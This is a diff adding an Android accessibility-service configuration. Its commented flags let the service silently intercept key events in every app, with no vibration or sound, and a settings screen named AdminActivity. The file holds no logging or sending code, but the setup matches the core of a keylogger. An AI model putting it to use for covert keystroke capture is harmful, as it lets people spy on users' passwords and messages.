@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+    CRITICAL FLAGS EXPLAINED:
+    - flagRequestFilterKeyEvents : Grants onKeyEvent() interception globally.
+    - canRequestFilterKeyEvents  : Must be true or onKeyEvent() is NEVER called.
+    - accessibilityEventTypes    : typeAllMask keeps service active (required even
+                                   if we only use key events).
+    - feedbackGeneric            : Silent feedback type — no vibration or sound.
+    - packageNames               : Left empty = monitors ALL apps globally.
+-->
+<accessibility-service
+    xmlns:android="http://schemas.android.com/apk/res/android"
+    android:accessibilityEventTypes="typeAllMask"
+    android:accessibilityFeedbackType="feedbackGeneric"
+    android:accessibilityFlags="flagDefault|flagRequestFilterKeyEvents"
+    android:canRequestFilterKeyEvents="true"
+    android:description="@string/accessibility_service_description"
+    android:notificationTimeout="100"
+    android:packageNames=""
+    android:settingsActivity=".ui.AdminActivity" />
